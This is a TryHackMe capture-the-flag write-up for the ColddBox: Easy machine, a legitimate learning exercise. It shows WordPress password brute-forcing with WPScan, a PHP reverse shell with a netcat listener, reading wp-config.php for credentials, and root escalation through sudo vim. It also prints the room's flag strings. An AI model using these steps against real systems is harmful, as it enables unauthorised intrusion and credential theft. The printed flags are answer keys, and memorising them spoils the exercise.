# ColddBox-WriteUp---TryHackMe
# ***Abdelhay Ferqass ***
**ColddBox: Easy**
*An easy level machine with multiple ways to escalate privileges. By Hixec.*

After running Nmap with the following command

`nmap -sC -sV -p- `

we get this:

`PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

ruuning ***Gobuster*** with this command :

`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/FULL_PATH_TO_YOUR_WORDLIST`

will lead you into *`/wp-admin`*

let's run `WPScan` since it's a wordpress cms

`abdelhay@K4LI:/data/vpn$ wpscan --url http://MACHINE_IP/ -e u -P /usr/share/wordlists/rockyou.txt `


and just like this we got **c0ldd's password : 9876543210**

get a reverseshell in 

`https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`

lunch a netcat listener with : 

`nc -nlvp 1234`

TCHA RAA!! we're www-data
establish your shell with 

`python -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

let's check a very sensitive php file with :

`www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php`


let's use those creds for ssh connection

`abdelhay@K4ALI:/data/vpn$ ssh c0ldd@10.10.124.265 -p 4512
c0ldd@ColddBox-Easy:~$ cat user.txt 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`

lets run   `sudo -l`

and we got 

`   (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp`


u can just run 

`sudo /usr/bin/vim`

and wirte this in

`:!/bin/bash`

and Congrats!! we're root now.

`c0ldd@ColddBox-Easy:~$  sudo /usr/bin/vim`


`root@ColddBox-Easy:/root# cat root.txt`

`wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=`

`root@ColddBox-Easy:/root# `








